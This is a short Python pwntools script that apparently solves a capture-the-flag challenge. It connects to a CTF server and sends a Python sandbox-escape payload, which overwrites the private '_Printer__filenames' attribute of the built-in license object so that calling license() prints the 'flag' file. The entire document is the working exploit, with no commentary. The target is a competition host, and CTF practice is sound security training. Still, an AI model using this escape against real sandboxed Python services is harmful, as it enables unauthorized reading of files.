from pwn import *

s = remote("paas-v2.hsctf.com", 1337)
s.sendlineafter(b"> ", b'setattr(license,input(),list((input(),)))')
s.sendline(b"_Printer__filenames")
s.sendline(b"flag")
s.sendlineafter(b"> ", b"license()")
print(s.recvuntil(b"> ").decode().split("\n")[0])
